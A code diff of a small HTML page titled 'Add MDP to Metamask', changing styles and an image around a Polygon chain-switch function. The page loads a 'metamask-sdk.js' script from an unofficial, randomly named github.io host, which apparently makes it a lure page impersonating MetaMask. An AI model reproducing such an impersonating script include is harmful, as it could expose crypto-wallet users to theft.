@@ -2,37 +2,37 @@
     <head>
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>ElectricDoge</title>
+        <title>Add MDP to Metamask</title>
         <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css" />
         <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
         <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
     </head>
 
     <style>
-        .img-wrap {
-            cursor: pointer;
-            max-width: 90%;
-            height: auto;
-        }
+      .container {
+        width: 85%; 
+        height: 100vh; 
+        margin: 20px auto;
+        overflow: hidden;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
 
-        .container {
-            width: 100vw;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
+     .responsive-img {
+        max-width: 100%;
+        max-height: 100%;
+        object-fit: contain;
+      }
     </style>
 
     <body>
         <div class="container">
-            <div class="img-wrap" id="addToken">
-                <img
-                    src="https://lh3.googleusercontent.com/g6cnO91PNIiMARWTn30UJpR3sr6hJM5haZkb0TkOzuiBBBE-IZCLqv_wKoCAeWLabC8uq4wFPT6hi8nZwFxZrmglvh-ewlxwVrCJdSTvRSHrsRfyGCri=w800"
-                    class="img-responsive"
-                    alt="001_(3).png"
-                />
-            </div>     
+          <img
+              src="https://lh3.googleusercontent.com/drive-viewer/AKGpihbAUw_57sIG75v0bHH9PL0xsjPegEPQ9twEmLuF8Hb7jV0VbbNocU6UMrEhy2VESiwiRXOaASKQtHgDPoyAimitjdP12peE-xI=s1600-rw-v1"
+              alt="metab.png"
+              class="responsive-img"
+          />
         </div>
 
         <script>
@@ -51,7 +51,7 @@
             }
 
             async function switchToPolygonChain() {
-                const chainId = "0x89"; // Polygon Mainnet
+                const chainId = "0x89"; // Polygon Mainnet Id
 
                 try {
                     await ethereum.request({
